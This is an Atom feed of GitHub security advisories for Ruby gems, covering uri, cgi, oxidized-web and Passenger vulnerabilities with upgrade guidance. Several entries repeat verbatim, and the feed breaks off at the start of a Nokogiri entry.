<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/rubygems.rss</id>
    <title>Security Advisory for Ruby gems hosted at RubyGems.org</title>
    <updated>2025-03-04T12:02:11.988Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arubygems"/>
    <subtitle>Security Advisory for Ruby gems hosted at RubyGems.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[uri] URI allows for userinfo Leakage in URI#join, URI#merge, and URI#+]]></title>
        <id>https://github.com/advisories/GHSA-22h5-pq3x-2gf2</id>
        <link href="https://github.com/advisories/GHSA-22h5-pq3x-2gf2"/>
        <updated>2025-03-04T02:44:53.000Z</updated>
        <content type="html"><![CDATA[<p>There is a possibility for userinfo leakage by in the uri gem.
This vulnerability has been assigned the CVE identifier CVE-2025-27221. We recommend upgrading the uri gem.</p>
<h2 id="details">Details</h2>
<p>The methods <code>URI#join</code>, <code>URI#merge</code>, and <code>URI#+</code> retained userinfo, such as <code>user:password</code>, even after the host is replaced. When generating a URL to a malicious host from a URL containing secret userinfo using these methods, and having someone access that URL, an unintended userinfo leak could occur.</p>
<p>Please update URI gem to version 0.11.3, 0.12.4, 0.13.2, 1.0.3 or later.</p>
<h2 id="affected-versions">Affected versions</h2>
<p>uri gem versions &lt; 0.11.3, 0.12.0 to 0.12.3, 0.13.0, 0.13.1 and 1.0.0 to 1.0.2.</p>
<h2 id="credits">Credits</h2>
<p>Thanks to Tsubasa Irisawa (lambdasawa) for discovering this issue.
Also thanks to nobu for additional fixes of this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/uri/pull/154">https://github.com/ruby/uri/pull/154</a></li>
<li><a href="https://github.com/ruby/uri/pull/155">https://github.com/ruby/uri/pull/155</a></li>
<li><a href="https://github.com/ruby/uri/pull/156">https://github.com/ruby/uri/pull/156</a></li>
<li><a href="https://github.com/ruby/uri/pull/157">https://github.com/ruby/uri/pull/157</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/uri/CVE-2025-27221.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/uri/CVE-2025-27221.yml</a></li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2025-27221">https://www.cve.org/CVERecord?id=CVE-2025-27221</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2025/02/26/security-advisories">https://www.ruby-lang.org/en/news/2025/02/26/security-advisories</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27221">https://nvd.nist.gov/vuln/detail/CVE-2025-27221</a></li>
<li><a href="https://hackerone.com/reports/2957667">https://hackerone.com/reports/2957667</a></li>
<li><a href="https://github.com/advisories/GHSA-22h5-pq3x-2gf2">https://github.com/advisories/GHSA-22h5-pq3x-2gf2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-22h5-pq3x-2gf2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-03T22:07:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[uri] URI allows for userinfo Leakage in URI#join, URI#merge, and URI#+]]></title>
        <id>https://github.com/advisories/GHSA-22h5-pq3x-2gf2</id>
        <link href="https://github.com/advisories/GHSA-22h5-pq3x-2gf2"/>
        <updated>2025-03-04T02:44:53.000Z</updated>
        <content type="html"><![CDATA[<p>There is a possibility for userinfo leakage by in the uri gem.
This vulnerability has been assigned the CVE identifier CVE-2025-27221. We recommend upgrading the uri gem.</p>
<h2 id="details">Details</h2>
<p>The methods <code>URI#join</code>, <code>URI#merge</code>, and <code>URI#+</code> retained userinfo, such as <code>user:password</code>, even after the host is replaced. When generating a URL to a malicious host from a URL containing secret userinfo using these methods, and having someone access that URL, an unintended userinfo leak could occur.</p>
<p>Please update URI gem to version 0.11.3, 0.12.4, 0.13.2, 1.0.3 or later.</p>
<h2 id="affected-versions">Affected versions</h2>
<p>uri gem versions &lt; 0.11.3, 0.12.0 to 0.12.3, 0.13.0, 0.13.1 and 1.0.0 to 1.0.2.</p>
<h2 id="credits">Credits</h2>
<p>Thanks to Tsubasa Irisawa (lambdasawa) for discovering this issue.
Also thanks to nobu for additional fixes of this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/uri/pull/154">https://github.com/ruby/uri/pull/154</a></li>
<li><a href="https://github.com/ruby/uri/pull/155">https://github.com/ruby/uri/pull/155</a></li>
<li><a href="https://github.com/ruby/uri/pull/156">https://github.com/ruby/uri/pull/156</a></li>
<li><a href="https://github.com/ruby/uri/pull/157">https://github.com/ruby/uri/pull/157</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/uri/CVE-2025-27221.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/uri/CVE-2025-27221.yml</a></li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2025-27221">https://www.cve.org/CVERecord?id=CVE-2025-27221</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2025/02/26/security-advisories">https://www.ruby-lang.org/en/news/2025/02/26/security-advisories</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27221">https://nvd.nist.gov/vuln/detail/CVE-2025-27221</a></li>
<li><a href="https://hackerone.com/reports/2957667">https://hackerone.com/reports/2957667</a></li>
<li><a href="https://github.com/advisories/GHSA-22h5-pq3x-2gf2">https://github.com/advisories/GHSA-22h5-pq3x-2gf2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-22h5-pq3x-2gf2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-03T22:07:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[uri] URI allows for userinfo Leakage in URI#join, URI#merge, and URI#+]]></title>
        <id>https://github.com/advisories/GHSA-22h5-pq3x-2gf2</id>
        <link href="https://github.com/advisories/GHSA-22h5-pq3x-2gf2"/>
        <updated>2025-03-04T02:44:53.000Z</updated>
        <content type="html"><![CDATA[<p>There is a possibility for userinfo leakage by in the uri gem.
This vulnerability has been assigned the CVE identifier CVE-2025-27221. We recommend upgrading the uri gem.</p>
<h2 id="details">Details</h2>
<p>The methods <code>URI#join</code>, <code>URI#merge</code>, and <code>URI#+</code> retained userinfo, such as <code>user:password</code>, even after the host is replaced. When generating a URL to a malicious host from a URL containing secret userinfo using these methods, and having someone access that URL, an unintended userinfo leak could occur.</p>
<p>Please update URI gem to version 0.11.3, 0.12.4, 0.13.2, 1.0.3 or later.</p>
<h2 id="affected-versions">Affected versions</h2>
<p>uri gem versions &lt; 0.11.3, 0.12.0 to 0.12.3, 0.13.0, 0.13.1 and 1.0.0 to 1.0.2.</p>
<h2 id="credits">Credits</h2>
<p>Thanks to Tsubasa Irisawa (lambdasawa) for discovering this issue.
Also thanks to nobu for additional fixes of this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/uri/pull/154">https://github.com/ruby/uri/pull/154</a></li>
<li><a href="https://github.com/ruby/uri/pull/155">https://github.com/ruby/uri/pull/155</a></li>
<li><a href="https://github.com/ruby/uri/pull/156">https://github.com/ruby/uri/pull/156</a></li>
<li><a href="https://github.com/ruby/uri/pull/157">https://github.com/ruby/uri/pull/157</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/uri/CVE-2025-27221.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/uri/CVE-2025-27221.yml</a></li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2025-27221">https://www.cve.org/CVERecord?id=CVE-2025-27221</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2025/02/26/security-advisories">https://www.ruby-lang.org/en/news/2025/02/26/security-advisories</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27221">https://nvd.nist.gov/vuln/detail/CVE-2025-27221</a></li>
<li><a href="https://hackerone.com/reports/2957667">https://hackerone.com/reports/2957667</a></li>
<li><a href="https://github.com/advisories/GHSA-22h5-pq3x-2gf2">https://github.com/advisories/GHSA-22h5-pq3x-2gf2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-22h5-pq3x-2gf2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-03T22:07:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[uri] URI allows for userinfo Leakage in URI#join, URI#merge, and URI#+]]></title>
        <id>https://github.com/advisories/GHSA-22h5-pq3x-2gf2</id>
        <link href="https://github.com/advisories/GHSA-22h5-pq3x-2gf2"/>
        <updated>2025-03-04T02:44:53.000Z</updated>
        <content type="html"><![CDATA[<p>There is a possibility for userinfo leakage by in the uri gem.
This vulnerability has been assigned the CVE identifier CVE-2025-27221. We recommend upgrading the uri gem.</p>
<h2 id="details">Details</h2>
<p>The methods <code>URI#join</code>, <code>URI#merge</code>, and <code>URI#+</code> retained userinfo, such as <code>user:password</code>, even after the host is replaced. When generating a URL to a malicious host from a URL containing secret userinfo using these methods, and having someone access that URL, an unintended userinfo leak could occur.</p>
<p>Please update URI gem to version 0.11.3, 0.12.4, 0.13.2, 1.0.3 or later.</p>
<h2 id="affected-versions">Affected versions</h2>
<p>uri gem versions &lt; 0.11.3, 0.12.0 to 0.12.3, 0.13.0, 0.13.1 and 1.0.0 to 1.0.2.</p>
<h2 id="credits">Credits</h2>
<p>Thanks to Tsubasa Irisawa (lambdasawa) for discovering this issue.
Also thanks to nobu for additional fixes of this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/uri/pull/154">https://github.com/ruby/uri/pull/154</a></li>
<li><a href="https://github.com/ruby/uri/pull/155">https://github.com/ruby/uri/pull/155</a></li>
<li><a href="https://github.com/ruby/uri/pull/156">https://github.com/ruby/uri/pull/156</a></li>
<li><a href="https://github.com/ruby/uri/pull/157">https://github.com/ruby/uri/pull/157</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/uri/CVE-2025-27221.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/uri/CVE-2025-27221.yml</a></li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2025-27221">https://www.cve.org/CVERecord?id=CVE-2025-27221</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2025/02/26/security-advisories">https://www.ruby-lang.org/en/news/2025/02/26/security-advisories</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27221">https://nvd.nist.gov/vuln/detail/CVE-2025-27221</a></li>
<li><a href="https://hackerone.com/reports/2957667">https://hackerone.com/reports/2957667</a></li>
<li><a href="https://github.com/advisories/GHSA-22h5-pq3x-2gf2">https://github.com/advisories/GHSA-22h5-pq3x-2gf2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-22h5-pq3x-2gf2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-03T22:07:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cgi] CGI has Regular Expression Denial of Service (ReDoS) potential in Util#escapeElement]]></title>
        <id>https://github.com/advisories/GHSA-mhwm-jh88-3gjf</id>
        <link href="https://github.com/advisories/GHSA-mhwm-jh88-3gjf"/>
        <updated>2025-03-04T02:44:48.000Z</updated>
        <content type="html"><![CDATA[<p>There is a possibility for Regular expression Denial of Service (ReDoS) by in the cgi gem. This vulnerability has been assigned the CVE identifier CVE-2025-27220. We recommend upgrading the cgi gem.</p>
<h2 id="details">Details</h2>
<p>The regular expression used in <code>CGI::Util#escapeElement</code> is vulnerable to ReDoS. The crafted input could lead to a high CPU consumption.</p>
<p>This vulnerability only affects Ruby 3.1 and 3.2. If you are using these versions, please update CGI gem to version 0.3.5.1, 0.3.7, 0.4.2 or later.</p>
<h2 id="affected-versions">Affected versions</h2>
<p>cgi gem versions &lt;= 0.3.5, 0.3.6, 0.4.0 and 0.4.1.</p>
<h2 id="credits">Credits</h2>
<p>Thanks to svalkanov for discovering this issue.
Also thanks to nobu for fixing this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/cgi/pull/52">https://github.com/ruby/cgi/pull/52</a></li>
<li><a href="https://github.com/ruby/cgi/pull/53">https://github.com/ruby/cgi/pull/53</a></li>
<li><a href="https://github.com/ruby/cgi/pull/54">https://github.com/ruby/cgi/pull/54</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27220.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27220.yml</a></li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2025-27220">https://www.cve.org/CVERecord?id=CVE-2025-27220</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2025/02/26/security-advisories">https://www.ruby-lang.org/en/news/2025/02/26/security-advisories</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27220">https://nvd.nist.gov/vuln/detail/CVE-2025-27220</a></li>
<li><a href="https://hackerone.com/reports/2890322">https://hackerone.com/reports/2890322</a></li>
<li><a href="https://github.com/advisories/GHSA-mhwm-jh88-3gjf">https://github.com/advisories/GHSA-mhwm-jh88-3gjf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mhwm-jh88-3gjf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-03T22:05:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cgi] CGI has Regular Expression Denial of Service (ReDoS) potential in Util#escapeElement]]></title>
        <id>https://github.com/advisories/GHSA-mhwm-jh88-3gjf</id>
        <link href="https://github.com/advisories/GHSA-mhwm-jh88-3gjf"/>
        <updated>2025-03-04T02:44:48.000Z</updated>
        <content type="html"><![CDATA[<p>There is a possibility for Regular expression Denial of Service (ReDoS) by in the cgi gem. This vulnerability has been assigned the CVE identifier CVE-2025-27220. We recommend upgrading the cgi gem.</p>
<h2 id="details">Details</h2>
<p>The regular expression used in <code>CGI::Util#escapeElement</code> is vulnerable to ReDoS. The crafted input could lead to a high CPU consumption.</p>
<p>This vulnerability only affects Ruby 3.1 and 3.2. If you are using these versions, please update CGI gem to version 0.3.5.1, 0.3.7, 0.4.2 or later.</p>
<h2 id="affected-versions">Affected versions</h2>
<p>cgi gem versions &lt;= 0.3.5, 0.3.6, 0.4.0 and 0.4.1.</p>
<h2 id="credits">Credits</h2>
<p>Thanks to svalkanov for discovering this issue.
Also thanks to nobu for fixing this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/cgi/pull/52">https://github.com/ruby/cgi/pull/52</a></li>
<li><a href="https://github.com/ruby/cgi/pull/53">https://github.com/ruby/cgi/pull/53</a></li>
<li><a href="https://github.com/ruby/cgi/pull/54">https://github.com/ruby/cgi/pull/54</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27220.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27220.yml</a></li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2025-27220">https://www.cve.org/CVERecord?id=CVE-2025-27220</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2025/02/26/security-advisories">https://www.ruby-lang.org/en/news/2025/02/26/security-advisories</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27220">https://nvd.nist.gov/vuln/detail/CVE-2025-27220</a></li>
<li><a href="https://hackerone.com/reports/2890322">https://hackerone.com/reports/2890322</a></li>
<li><a href="https://github.com/advisories/GHSA-mhwm-jh88-3gjf">https://github.com/advisories/GHSA-mhwm-jh88-3gjf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mhwm-jh88-3gjf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-03T22:05:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cgi] CGI has Regular Expression Denial of Service (ReDoS) potential in Util#escapeElement]]></title>
        <id>https://github.com/advisories/GHSA-mhwm-jh88-3gjf</id>
        <link href="https://github.com/advisories/GHSA-mhwm-jh88-3gjf"/>
        <updated>2025-03-04T02:44:48.000Z</updated>
        <content type="html"><![CDATA[<p>There is a possibility for Regular expression Denial of Service (ReDoS) by in the cgi gem. This vulnerability has been assigned the CVE identifier CVE-2025-27220. We recommend upgrading the cgi gem.</p>
<h2 id="details">Details</h2>
<p>The regular expression used in <code>CGI::Util#escapeElement</code> is vulnerable to ReDoS. The crafted input could lead to a high CPU consumption.</p>
<p>This vulnerability only affects Ruby 3.1 and 3.2. If you are using these versions, please update CGI gem to version 0.3.5.1, 0.3.7, 0.4.2 or later.</p>
<h2 id="affected-versions">Affected versions</h2>
<p>cgi gem versions &lt;= 0.3.5, 0.3.6, 0.4.0 and 0.4.1.</p>
<h2 id="credits">Credits</h2>
<p>Thanks to svalkanov for discovering this issue.
Also thanks to nobu for fixing this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/cgi/pull/52">https://github.com/ruby/cgi/pull/52</a></li>
<li><a href="https://github.com/ruby/cgi/pull/53">https://github.com/ruby/cgi/pull/53</a></li>
<li><a href="https://github.com/ruby/cgi/pull/54">https://github.com/ruby/cgi/pull/54</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27220.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27220.yml</a></li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2025-27220">https://www.cve.org/CVERecord?id=CVE-2025-27220</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2025/02/26/security-advisories">https://www.ruby-lang.org/en/news/2025/02/26/security-advisories</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27220">https://nvd.nist.gov/vuln/detail/CVE-2025-27220</a></li>
<li><a href="https://hackerone.com/reports/2890322">https://hackerone.com/reports/2890322</a></li>
<li><a href="https://github.com/advisories/GHSA-mhwm-jh88-3gjf">https://github.com/advisories/GHSA-mhwm-jh88-3gjf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mhwm-jh88-3gjf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-03T22:05:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cgi] CGI has Denial of Service (DoS) potential in Cookie.parse]]></title>
        <id>https://github.com/advisories/GHSA-gh9q-2xrm-x6qv</id>
        <link href="https://github.com/advisories/GHSA-gh9q-2xrm-x6qv"/>
        <updated>2025-03-04T02:44:43.000Z</updated>
        <content type="html"><![CDATA[<p>There is a possibility for DoS by in the cgi gem.
This vulnerability has been assigned the CVE identifier CVE-2025-27219. We recommend upgrading the cgi gem.</p>
<h2 id="details">Details</h2>
<p>CGI::Cookie.parse took super-linear time to parse a cookie string in some cases. Feeding a maliciously crafted cookie string into the method could lead to a Denial of Service.</p>
<p>Please update CGI gem to version 0.3.5.1, 0.3.7, 0.4.2 or later.</p>
<h2 id="affected-versions">Affected versions</h2>
<p>cgi gem versions &lt;= 0.3.5, 0.3.6, 0.4.0 and 0.4.1.</p>
<h2 id="credits">Credits</h2>
<p>Thanks to lio346 for discovering this issue.
Also thanks to mame for fixing this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/cgi/pull/52">https://github.com/ruby/cgi/pull/52</a></li>
<li><a href="https://github.com/ruby/cgi/pull/53">https://github.com/ruby/cgi/pull/53</a></li>
<li><a href="https://github.com/ruby/cgi/pull/54">https://github.com/ruby/cgi/pull/54</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27219.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27219.yml</a></li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2025-27219">https://www.cve.org/CVERecord?id=CVE-2025-27219</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27219">https://nvd.nist.gov/vuln/detail/CVE-2025-27219</a></li>
<li><a href="https://hackerone.com/reports/2936778">https://hackerone.com/reports/2936778</a></li>
<li><a href="https://github.com/advisories/GHSA-gh9q-2xrm-x6qv">https://github.com/advisories/GHSA-gh9q-2xrm-x6qv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gh9q-2xrm-x6qv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-03T20:53:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cgi] CGI has Denial of Service (DoS) potential in Cookie.parse]]></title>
        <id>https://github.com/advisories/GHSA-gh9q-2xrm-x6qv</id>
        <link href="https://github.com/advisories/GHSA-gh9q-2xrm-x6qv"/>
        <updated>2025-03-04T02:44:43.000Z</updated>
        <content type="html"><![CDATA[<p>There is a possibility for DoS by in the cgi gem.
This vulnerability has been assigned the CVE identifier CVE-2025-27219. We recommend upgrading the cgi gem.</p>
<h2 id="details">Details</h2>
<p>CGI::Cookie.parse took super-linear time to parse a cookie string in some cases. Feeding a maliciously crafted cookie string into the method could lead to a Denial of Service.</p>
<p>Please update CGI gem to version 0.3.5.1, 0.3.7, 0.4.2 or later.</p>
<h2 id="affected-versions">Affected versions</h2>
<p>cgi gem versions &lt;= 0.3.5, 0.3.6, 0.4.0 and 0.4.1.</p>
<h2 id="credits">Credits</h2>
<p>Thanks to lio346 for discovering this issue.
Also thanks to mame for fixing this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/cgi/pull/52">https://github.com/ruby/cgi/pull/52</a></li>
<li><a href="https://github.com/ruby/cgi/pull/53">https://github.com/ruby/cgi/pull/53</a></li>
<li><a href="https://github.com/ruby/cgi/pull/54">https://github.com/ruby/cgi/pull/54</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27219.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27219.yml</a></li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2025-27219">https://www.cve.org/CVERecord?id=CVE-2025-27219</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27219">https://nvd.nist.gov/vuln/detail/CVE-2025-27219</a></li>
<li><a href="https://hackerone.com/reports/2936778">https://hackerone.com/reports/2936778</a></li>
<li><a href="https://github.com/advisories/GHSA-gh9q-2xrm-x6qv">https://github.com/advisories/GHSA-gh9q-2xrm-x6qv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gh9q-2xrm-x6qv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-03T20:53:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cgi] CGI has Denial of Service (DoS) potential in Cookie.parse]]></title>
        <id>https://github.com/advisories/GHSA-gh9q-2xrm-x6qv</id>
        <link href="https://github.com/advisories/GHSA-gh9q-2xrm-x6qv"/>
        <updated>2025-03-04T02:44:43.000Z</updated>
        <content type="html"><![CDATA[<p>There is a possibility for DoS by in the cgi gem.
This vulnerability has been assigned the CVE identifier CVE-2025-27219. We recommend upgrading the cgi gem.</p>
<h2 id="details">Details</h2>
<p>CGI::Cookie.parse took super-linear time to parse a cookie string in some cases. Feeding a maliciously crafted cookie string into the method could lead to a Denial of Service.</p>
<p>Please update CGI gem to version 0.3.5.1, 0.3.7, 0.4.2 or later.</p>
<h2 id="affected-versions">Affected versions</h2>
<p>cgi gem versions &lt;= 0.3.5, 0.3.6, 0.4.0 and 0.4.1.</p>
<h2 id="credits">Credits</h2>
<p>Thanks to lio346 for discovering this issue.
Also thanks to mame for fixing this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/cgi/pull/52">https://github.com/ruby/cgi/pull/52</a></li>
<li><a href="https://github.com/ruby/cgi/pull/53">https://github.com/ruby/cgi/pull/53</a></li>
<li><a href="https://github.com/ruby/cgi/pull/54">https://github.com/ruby/cgi/pull/54</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27219.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27219.yml</a></li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2025-27219">https://www.cve.org/CVERecord?id=CVE-2025-27219</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27219">https://nvd.nist.gov/vuln/detail/CVE-2025-27219</a></li>
<li><a href="https://hackerone.com/reports/2936778">https://hackerone.com/reports/2936778</a></li>
<li><a href="https://github.com/advisories/GHSA-gh9q-2xrm-x6qv">https://github.com/advisories/GHSA-gh9q-2xrm-x6qv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gh9q-2xrm-x6qv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-03T20:53:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[oxidized-web] Oxidized Web RANCID migration page allows unauthenticated user to gain control over Linux user account]]></title>
        <id>https://github.com/advisories/GHSA-jx6p-9c26-g373</id>
        <link href="https://github.com/advisories/GHSA-jx6p-9c26-g373"/>
        <updated>2025-03-03T20:12:31.000Z</updated>
        <content type="html"><![CDATA[<p>In oxidized-web (aka Oxidized Web) before 0.15.0, the RANCID migration page allows an unauthenticated user to gain control over the Linux user account that is running oxidized-web.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27590">https://nvd.nist.gov/vuln/detail/CVE-2025-27590</a></li>
<li><a href="https://github.com/ytti/oxidized-web/commit/a5220a0ddc57b85cd122bffee228d3ed4901668e">https://github.com/ytti/oxidized-web/commit/a5220a0ddc57b85cd122bffee228d3ed4901668e</a></li>
<li><a href="https://github.com/ytti/oxidized-web/releases/tag/0.15.0">https://github.com/ytti/oxidized-web/releases/tag/0.15.0</a></li>
<li><a href="https://github.com/advisories/GHSA-jx6p-9c26-g373">https://github.com/advisories/GHSA-jx6p-9c26-g373</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jx6p-9c26-g373</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-03-03T06:30:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[passenger] Phusion Passenger denial of service ]]></title>
        <id>https://github.com/advisories/GHSA-2cj2-qqxj-5m3r</id>
        <link href="https://github.com/advisories/GHSA-2cj2-qqxj-5m3r"/>
        <updated>2025-02-26T21:42:56.000Z</updated>
        <content type="html"><![CDATA[<p>The http parser in Phusion Passenger 6.0.21 through 6.0.25 before 6.0.26 allows a denial of service during parsing of a request with an invalid HTTP method.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-26803">https://nvd.nist.gov/vuln/detail/CVE-2025-26803</a></li>
<li><a href="https://github.com/phusion/passenger/commit/bb15591646687064ab2d578d5f9660b2a4168017">https://github.com/phusion/passenger/commit/bb15591646687064ab2d578d5f9660b2a4168017</a></li>
<li><a href="https://blog.phusion.nl/2025/02/19/passenger-6-0-26">https://blog.phusion.nl/2025/02/19/passenger-6-0-26</a></li>
<li><a href="https://github.com/phusion/passenger/compare/release-6.0.25...release-6.0.26">https://github.com/phusion/passenger/compare/release-6.0.25...release-6.0.26</a></li>
<li><a href="https://github.com/phusion/passenger/releases/tag/release-6.0.26">https://github.com/phusion/passenger/releases/tag/release-6.0.26</a></li>
<li><a href="https://www.phusionpassenger.com/support">https://www.phusionpassenger.com/support</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/passenger/CVE-2025-26803.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/passenger/CVE-2025-26803.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-2cj2-qqxj-5m3r">https://github.com/advisories/GHSA-2cj2-qqxj-5m3r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2cj2-qqxj-5m3r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-24T18:32:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nokogiri] Nokogiri updates packaged libxml2 to 2.13.6 to resolve CVE-2025-24928 and CVE-2024-56171]]></title>
        <id>https://github.com/advisories/GHSA-5mwf-688x-mr7x</id>
        <link href="https://github.com/advisories/GHSA-5mwf-688x-mr7x"/>
        <updated>2025-02-19T22:17:20.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
